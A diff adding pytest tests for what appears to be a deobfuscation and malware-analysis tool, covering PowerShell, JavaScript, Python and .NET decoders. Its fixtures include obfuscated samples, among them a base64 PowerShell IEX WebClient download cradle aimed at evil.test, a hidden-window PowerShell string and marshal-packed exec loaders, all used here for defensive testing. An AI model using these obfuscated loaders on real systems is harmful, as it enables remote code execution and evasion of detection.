@@ -9,16 +9,25 @@ extraction, and readability scoring.
 
 from __future__ import annotations
 
+import ast
 import base64
+import shutil
 
 import pytest
 
+from tests.dotnet_test_utils import (
+    build_resx,
+    build_test_dotnet_assembly,
+    build_test_dotnet_assembly_with_resources,
+)
 from app.services.transforms.base import TransformResult
 from app.services.transforms.base64_decoder import (
     Base64Decoder,
     _is_plausible_b64,
     _try_decode,
 )
+from app.services.transforms.constant_folder import ConstantFolder
+from app.services.transforms.dotnet_assembly_analyzer import DotNetAssemblyAnalyzer
 from app.services.transforms.hex_decoder import (
     HexDecoder,
     _decode_backslash_x,
@@ -27,11 +36,22 @@ from app.services.transforms.hex_decoder import (
     _decode_percent_hex,
     _decode_hex_stream,
 )
+from app.services.transforms.eval_detection import EvalExecDetector
+from app.services.transforms.javascript_encoder_decoder import JavaScriptEncoderDecoder
+from app.services.transforms.js_packer_unpacker import JavaScriptPackerUnpacker
+from app.services.transforms.js_resolvers import JavaScriptArrayResolver
+from app.services.transforms.language_detector import LanguageDetector
+from app.services.transforms.powershell_decoder import PowerShellDecoder
+from app.services.transforms.python_decoder import PythonDecoder
+from app.services.transforms.python_serialization_decoder import PythonSerializationDecoder
+from app.services.transforms.source_preprocessor import SourcePreprocessor
+from app.services.transforms.string_decryptor import StringDecryptor
 from app.services.transforms.string_extraction import (
     StringExtractor,
     _strip_quotes,
     _flag_string,
 )
+from app.services.transforms.xor_recovery import XorRecovery
 from app.services.analysis.state_manager import StateManager
 
 
@@ -401,6 +421,185 @@ class TestConstantFolding:
         result = extractor.apply(code, "python", state)
         assert result.success is True
 
+    def test_constant_folder_preserves_embedded_quotes(self):
+        folder = ConstantFolder()
+        code = """eval('console' + '.' + 'log' + '(' + '"loaded"' + ')');"""
+
+        result = folder.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert """eval('console.log("loaded")');""" in result.output
+
+
+# ════════════════════════════════════════════════════════════════════════
+#  Source Preprocessing / Beautification
+# ════════════════════════════════════════════════════════════════════════
+
+class TestSourcePreprocessor:
+    def setup_method(self):
+        self.preprocessor = SourcePreprocessor()
+
+    def test_beautifies_likely_minified_javascript(self):
+        code = (
+            "function run(){const alpha=1;const beta=2;const gamma=3;const delta=4;"
+            "return alpha+beta+gamma+delta;}function beacon(){const url='https://a.test';"
+            "return fetch(url).then(r=>r.text());}"
+        )
+
+        result = self.preprocessor.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert "\n" in result.output
+        assert "minified_code_beautification" in result.details["detected_techniques"]
+
+    def test_normalizes_anomalous_whitespace_without_touching_strings(self):
+        code = "const\u200b flag\u00a0=\u00a0false;\nconsole.log('x\u200by');"
+
+        result = self.preprocessor.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert "const flag = false;" in result.output
+        assert "'x\u200by'" in result.output
+        assert "source_anomaly_normalization" in result.details["detected_techniques"]
+
+    def test_beautifies_parseable_minified_python_only_when_layout_is_bad(self):
+        code = (
+            "def run(): a='alpha'; b='beta'; c='gamma'; d='delta'; "
+            "payload=a+b+c+d; return payload\n"
+        )
+
+        result = self.preprocessor.apply(code, "python", {})
+
+        assert result.success is True
+        assert "def run():" in result.output
+        assert "payload = a + b + c + d" in result.output
+        assert result.details["preprocessing"]["beautifier"] == "python_black"
+
+    def test_black_preserves_python_comments_when_beautifying(self):
+        code = (
+            "def run():  # keep this note\n"
+            "    alpha='a'; beta='b'; gamma='c'; delta='d'; epsilon='e'; zeta='f'; "
+            "payload=alpha+beta+gamma+delta+epsilon+zeta; return payload\n"
+        )
+
+        result = self.preprocessor.apply(code, "python", {})
+
+        assert result.success is True
+        assert "# keep this note" in result.output
+        assert "payload = alpha + beta + gamma + delta + epsilon + zeta" in result.output
+        assert result.details["preprocessing"]["beautifier"] == "python_black"
+
+    def test_skips_python_beautifier_when_code_is_already_readable(self):
+        code = (
+            "def run():\n"
+            "    payload = 'decoded'\n"
+            "    return payload\n"
+        )
+
+        assert self.preprocessor.can_apply(code, "python", {}) is False
+
+    def test_skips_binary_dotnet_payloads(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        assembly = build_test_dotnet_assembly(
+            """
+            namespace Sample;
+            public class Loader
+            {
+                public static string Url => "http://evil.test/a";
+            }
+            """,
+            "BinaryPreprocessTest",
+        )
+        code = assembly.decode("latin-1")
+
+        assert self.preprocessor.can_apply(code, "", {}) is False
+
+
+# ════════════════════════════════════════════════════════════════════════
+#  JavaScript array resolver
+# ════════════════════════════════════════════════════════════════════════
+
+class TestJavaScriptArrayResolver:
+    def test_folds_deterministic_array_rotation_and_removes_runtime_helper(self):
+        resolver = JavaScriptArrayResolver()
+        code = (
+            'var _0xabc = ["a", "b", "c"];\n'
+            "(function(_0xArr,_0xRot){while(--_0xRot)_0xArr.push(_0xArr.shift());})(_0xabc,0x1);\n"
+            "console.log(_0xabc[0]);\n"
+        )
+
+        result = resolver.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert 'var _0xabc = ["b", "c", "a"];' in result.output
+        assert "push(_0xArr.shift())" not in result.output
+        assert 'console.log("b");' in result.output
+        assert "deterministic_array_rotation_fold" in result.details["detected_techniques"]
+
+    def test_resolves_function_expression_wrapper_with_string_indexes(self):
+        resolver = JavaScriptArrayResolver()
+        code = (
+            "var _0x4a2b = ['aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=', 'bG9jYWxTdG9yYWdl'];\n"
+            "var _0xf1 = function(_0x1, _0x2) {\n"
+            "    _0x1 = _0x1 - 0x0;\n"
+            "    var _0x3 = _0x4a2b[_0x1];\n"
+            "    if (_0xf1['initialized'] === undefined) {\n"
+            "        _0xf1['initialized'] = true;\n"
+            "    }\n"
+            "    return _0x3;\n"
+            "};\n"
+            "var url = atob(_0xf1('0x0'));\n"
+            "var storage = _0xf1('0x1');\n"
+        )
+
+        result = resolver.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert 'var url = atob("aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=");' in result.output
+        assert 'var storage = "bG9jYWxTdG9yYWdl";' in result.output
+        assert "_0xf1('0x0')" not in result.output
+        assert "_0xf1('0x1')" not in result.output
+        assert "wrapper_runtime_removed" in [
+            item["type"] for item in result.details["static_rewrites"]
+        ]
+
+
+# ════════════════════════════════════════════════════════════════════════
+#  Sink detection metadata
+# ════════════════════════════════════════════════════════════════════════
+
+class TestEvalExecDetector:
+    def test_emits_identified_sink_metadata(self):
+        detector = EvalExecDetector()
+        result = detector.apply("eval(payload);", "javascript", {})
+
+        assert result.success is True
+        assert result.details["identified_sinks"][0]["family"] == "dynamic_code_execution"
+        assert "eval:high" in result.details["suspicious_apis"]
+
+
+class TestLanguageDetector:
+    def test_detects_dotnet_binary_assembly(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        detector = LanguageDetector()
+        assembly = build_test_dotnet_assembly(
+            """
+            namespace Sample;
+            public class Loader
+            {
+                public static void Run() { }
+            }
+            """,
+            "LanguageDetectAssembly",
+        )
+
+        result = detector.apply(assembly.decode("latin-1"), "", {})
+
+        assert result.success is True
+        assert result.details["detected"] == "dotnet"
+
 
 # ════════════════════════════════════════════════════════════════════════
 #  Language Detection (heuristic via string patterns)
@@ -567,3 +766,501 @@ class TestTransformResult:
             success=True, output="x", confidence=0.5, description="test", details=None
         )
         assert r.details == {}
+
+
+class TestAdditionalDecoderCoverage:
+    def test_base64_decoder_keeps_js_parseable(self):
+        decoder = Base64Decoder()
+        result = decoder.apply(
+            'var payload = atob("cHJpbnQoImhlbGxvIik=");',
+            "javascript",
+            {},
+        )
+        assert result.success is True
+        assert result.output == 'var payload = "print(\\"hello\\")";'
+
+    def test_hex_decoder_keeps_js_parseable(self):
+        decoder = HexDecoder()
+        result = decoder.apply(r'var payload = "\x68\x69";', "javascript", {})
+        assert result.success is True
+        assert result.output == 'var payload = "hi";'
+
+    def test_powershell_getstring_wrapper_is_decoded(self):
+        decoder = PowerShellDecoder()
+        blob = (
+            "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMA"
+            "bABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgA"
+            "dAB0AHAAOgAvAC8AZQB2AGkAbAAuAHQAZQBzAHQALwBhACcAKQA="
+        )
+        code = (
+            "iex ([System.Text.Encoding]::Unicode.GetString("
+            f"[System.Convert]::FromBase64String('{blob}')))"
+        )
+        result = decoder.apply(code, "powershell", {})
+        assert result.success is True
+        assert "http://evil.test/a" in result.output
+        assert any(
+            item["decoded"].startswith("IEX (New-Object")
+            for item in result.details["decoded_strings"]
+        )
+
+    def test_powershell_compressed_getstring_wrapper_is_decoded(self):
+        decoder = PowerShellDecoder()
+        code = (
+            "iex ([System.Text.Encoding]::UTF8.GetString("
+            " (New-Object IO.Compression.GzipStream("
+            "  (New-Object IO.MemoryStream(,[Convert]::FromBase64String("
+            "   'H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA=='"
+            "  ))),"
+            "  [IO.Compression.CompressionMode]::Decompress"
+            " )))"
+            "))"
+        )
+
+        result = decoder.apply(code, "powershell", {})
+
+        assert result.success is True
+        assert "hello world" in result.output
+        assert any(
+            item["decoded"] == "hello world"
+            for item in result.details["decoded_strings"]
+        )
+
+    def test_powershell_char_array_join_is_folded(self):
+        decoder = PowerShellDecoder()
+        result = decoder.apply("iex(([char[]](73,69,88)) -join '')", "powershell", {})
+
+        assert result.success is True
+        assert '"IEX"' in result.output
+        assert any(
+            change["type"] == "char_array_join"
+            for change in result.details["changes"]
+        )
+
+    def test_powershell_decoder_resolves_variable_backed_getstring_and_iex(self):
+        decoder = PowerShellDecoder()
+        code = (
+            "$a = [System.Convert]::FromBase64String('aHR0cDovL2V4YW1wbGUuY29tL3BheWxvYWQ=')\n"
+            "$url = [System.Text.Encoding]::UTF8.GetString($a)\n"
+            "$encoded = 'JABjACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQA'\n"
+            "$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))\n"
+            "IEX $decoded\n"
+        )
+
+        result = decoder.apply(code, "powershell", {})
+
+        assert result.success is True
+        assert "$url = 'http://example.com/payload'" in result.output
+        assert "# DECODED (IEX):" in result.output
+        assert "New-Object System.Net.WebClient" in result.output
+        assert any(
+            change["type"] == "binding_getstring"
+            for change in result.details["changes"]
+        )
+
+    def test_string_decryptor_resolves_single_use_helper(self):
+        decoder = StringDecryptor()
+        code = (
+            "function decodeString(s){return s.split('').reverse().join('');}\n"
+            'alert(decodeString("cba"));'
+        )
+        result = decoder.apply(code, "javascript", {})
+        assert result.success is True
+        assert '"abc"' in result.output
+        assert result.details["decrypted_strings"][0]["decrypted"] == "abc"
+
+    def test_xor_recovery_prefers_explicit_key_for_decimal_arrays(self):
+        decoder = XorRecovery()
+        code = "const data = [29,16,25,25,26]; data.map(b => b ^ 0x75)"
+        result = decoder.apply(code, "javascript", {})
+        assert result.success is True
+        assert result.details["results"][0]["method"] == "explicit_key_context"
+        assert result.details["results"][0]["decoded"] == "hello"
+        assert '"hello"' in result.output
+
+    def test_js_packer_unpacker_unwraps_dean_edwards_payload(self):
+        decoder = JavaScriptPackerUnpacker()
+        code = (
+            "eval(function(p,a,c,k,e,d){"
+            "e=function(c){return c.toString(a)};"
+            "if(!''.replace(/^/,String)){"
+            "while(c--)d[c.toString(a)]=k[c]||c.toString(a);"
+            "k=[function(e){return d[e]}];"
+            "e=function(){return'\\\\w+'};"
+            "c=1;};"
+            "while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);"
+            "return p;"
+            "}('0(\\'1\\');',2,2,'alert|test'.split('|'),0,{}))"
+        )
+
+        result = decoder.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert "alert('test');" in result.output
+        assert "dean_edwards_packer" in result.details["detected_techniques"]
+
+    def test_javascript_encoder_decoder_unwraps_constructor_chain(self):
+        decoder = JavaScriptEncoderDecoder()
+        code = '[]["filter"]["constructor"]("alert(\\"ok\\")")()'
+
+        result = decoder.apply(code, "javascript", {})
+
+        assert result.success is True
+        assert 'alert("ok")' in result.output
+        assert "javascript_runtime_encoder" in result.details["detected_techniques"]
+
+    def test_dotnet_assembly_analyzer_extracts_metadata_and_strings(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            using System;
+
+            namespace Sample;
+
+            public delegate string ProxyDelegate();
+
+            public class Loader
+            {
+                public static string Beacon()
+                {
+                    return "http://evil.test/a";
+                }
+
+                public static string CallProxy()
+                {
+                    ProxyDelegate proxy = Beacon;
+                    return proxy();
+                }
+            }
+            """,
+            "AssemblyAnalyzerSample",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "Assembly: AssemblyAnalyzerSample" in result.output
+        assert "public string Beacon()" in result.output
+        assert 'return "http://evil.test/a";' in result.output
+        assert "Sample.Loader.Beacon" in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "http://evil.test/a" in decoded
+        assert "Sample.Loader.Beacon" in result.details["functions"]
+        assert "System.Runtime" in result.details["imports"]
+        assert "dotnet_assembly" in result.details["detected_techniques"]
+
+    def test_dotnet_assembly_analyzer_extracts_embedded_resource_text(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly_with_resources(
+            """
+            using System.IO;
+            using System.Reflection;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string ReadPayload()
+                {
+                    using Stream stream = Assembly.GetExecutingAssembly()
+                        .GetManifestResourceStream("ResourceBackedAssembly.payload.txt")!;
+                    using var reader = new StreamReader(stream);
+                    return reader.ReadToEnd();
+                }
+            }
+            """,
+            "ResourceBackedAssembly",
+            {"payload.txt": "powershell -nop -w hidden"},
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "ResourceBackedAssembly.payload.txt" in result.output
+        assert 'return "powershell -nop -w hidden";' in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "powershell -nop -w hidden" in decoded
+        assert "embedded_resource" in result.details["detected_techniques"]
+
+    def test_dotnet_assembly_analyzer_inlines_single_hop_proxy_calls(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string Beacon()
+                {
+                    return "http://evil.test/a";
+                }
+
+                public static string Wrapper()
+                {
+                    return Beacon();
+                }
+            }
+            """,
+            "ProxyInlineAssembly",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "public string Wrapper()" in result.output
+        assert 'return "http://evil.test/a";' in result.output
+
+    def test_dotnet_assembly_analyzer_inlines_multi_hop_proxy_chain(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string Beacon()
+                {
+                    return "http://evil.test/a";
+                }
+
+                public static string Layer2()
+                {
+                    return Beacon();
+                }
+
+                public static string Layer1()
+                {
+                    return Layer2();
+                }
+            }
+            """,
+            "ProxyChainAssembly",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "public string Layer1()" in result.output
+        assert 'return "http://evil.test/a";' in result.output
+
+    def test_dotnet_assembly_analyzer_extracts_resx_resource_manager_strings(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly_with_resources(
+            """
+            using System.Globalization;
+            using System.Reflection;
+            using System.Resources;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                private static readonly ResourceManager ResourceManager =
+                    new("ResourceManagerAssembly.Strings", typeof(Loader).Assembly);
+
+                public static string ReadPayload()
+                {
+                    return ResourceManager.GetString("Payload", CultureInfo.InvariantCulture)!;
+                }
+            }
+            """,
+            "ResourceManagerAssembly",
+            {"Strings.resx": build_resx({"Payload": "https://evil.test/resx"})},
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "ResourceManagerAssembly.Strings.resources" in result.output
+        assert "[Payload] https://evil.test/resx" in result.output
+        assert 'return "https://evil.test/resx";' in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "https://evil.test/resx" in decoded
+
+    def test_dotnet_assembly_analyzer_propagates_static_field_base64_decode(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            using System;
+            using System.Text;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                private static readonly string Blob = "aGVsbG8gd29ybGQ=";
+
+                public static string Decode()
+                {
+                    return Encoding.UTF8.GetString(Convert.FromBase64String(Blob));
+                }
+            }
+            """,
+            "FieldBackedDecodeAssembly",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "public string Decode()" in result.output
+        assert 'return "hello world";' in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "hello world" in decoded
+
+    def test_dotnet_assembly_analyzer_decodes_gzip_base64_string_helpers(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            using System;
+            using System.IO;
+            using System.IO.Compression;
+            using System.Text;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string Inflate()
+                {
+                    using var source = new MemoryStream(Convert.FromBase64String("H4sIAAAAAAAAE8tIzcnJVyjPL8pJAQCFEUoNCwAAAA=="));
+                    using var gzip = new GZipStream(source, CompressionMode.Decompress);
+                    using var reader = new StreamReader(gzip, Encoding.UTF8);
+                    return reader.ReadToEnd();
+                }
+            }
+            """,
+            "CompressedDecodeAssembly",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "public string Inflate()" in result.output
+        assert 'return "hello world";' in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "hello world" in decoded
+
+    def test_dotnet_assembly_analyzer_folds_stringbuilder_strings(self):
+        if shutil.which("dotnet") is None:
+            pytest.skip("dotnet unavailable")
+        decoder = DotNetAssemblyAnalyzer()
+        assembly = build_test_dotnet_assembly(
+            """
+            using System.Text;
+
+            namespace Sample;
+
+            public class Loader
+            {
+                public static string BuildUrl()
+                {
+                    var builder = new StringBuilder();
+                    builder.Append("https://");
+                    builder.Append("evil.test/");
+                    builder.Append("builder");
+                    return builder.ToString();
+                }
+            }
+            """,
+            "StringBuilderAssembly",
+        )
+
+        result = decoder.apply(assembly.decode("latin-1"), "dotnet", {})
+
+        assert result.success is True
+        assert "public string BuildUrl()" in result.output
+        assert 'return "https://evil.test/builder";' in result.output
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "https://evil.test/builder" in decoded
+
+    def test_python_serialization_decoder_keeps_python_parseable(self):
+        decoder = PythonSerializationDecoder()
+        import marshal
+
+        payload = marshal.dumps(
+            compile(
+                'import os\nurl="http://evil.test"\ndef beacon():\n    return os.name\nprint(beacon())',
+                "<x>",
+                "exec",
+            )
+        )
+        blob = base64.b64encode(payload).decode()
+        code = (
+            "import base64, marshal\n"
+            f'exec(marshal.loads(base64.b64decode("{blob}")))'
+        )
+        result = decoder.apply(code, "python", {})
+        assert result.success is True
+        ast.parse(result.output)
+        decoded = [item["decoded"] for item in result.details["decoded_strings"]]
+        assert "http://evil.test" in decoded
+        assert result.details["imports"] == ["os"]
+        assert "beacon" in result.details["functions"]
+        assert result.details["marshal_analysis"][0]["ok"] is True
+        assert any(
+            "IMPORT_NAME 'os'" in line
+            for line in result.details["disassembly_preview"]
+        )
+
+    def test_python_decoder_unwraps_exec_compile_literal_bindings(self):
+        decoder = PythonDecoder()
+        code = (
+            'src = "print(\\"hi\\")"\n'
+            "exec(compile(src, '<x>', 'exec'))"
+        )
+
+        result = decoder.apply(code, "python", {})
+
+        assert result.success is True
+        ast.parse(result.output)
+        assert 'print("hi")' in result.output
+        assert any(
+            change["type"] == "exec_compile"
+            for change in result.details["changes"]
+        )
+
+    def test_python_decoder_unwraps_exec_compile_with_inline_base64(self):
+        decoder = PythonDecoder()
+        blob = base64.b64encode(b"print('hello')").decode()
+        code = (
+            "import base64\n"
+            f"exec(compile(base64.b64decode('{blob}').decode(), '<x>', 'exec'))"
+        )
+
+        result = decoder.apply(code, "python", {})
+
+        assert result.success is True
+        ast.parse(result.output)
+        assert "print('hello')" in result.output
+
+    def test_python_decoder_unwraps_exec_with_variable_backed_base64(self):
+        decoder = PythonDecoder()
+        code = (
+            "import base64\n"
+            "_x = 'aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2VjaG8gZGVtbycp'\n"
+            "exec(base64.b64decode(_x))\n"
+        )
+
+        result = decoder.apply(code, "python", {})
+
+        assert result.success is True
+        ast.parse(result.output)
+        assert "import os; os.system('echo demo')" in result.output
+        assert any(
+            change["type"] == "exec_resolved"
+            for change in result.details["changes"]
+        )
